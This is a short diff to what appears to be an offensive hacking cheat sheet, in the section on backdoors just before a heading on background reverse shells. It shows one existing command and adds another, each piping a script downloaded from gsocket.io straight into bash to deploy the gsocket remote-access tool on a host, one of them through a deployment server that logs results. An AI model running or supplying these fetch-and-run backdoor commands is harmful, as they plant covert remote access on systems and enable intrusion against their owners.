@@ -1132,6 +1132,11 @@ or
 bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
 ```
 
+or deploy gsocket by running their own deployment server:
+```sh
+LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/xs)"
+```
+
 <a id="backdoor-background-reverse-shell"></a>
 **6.i. Background reverse shell**
 
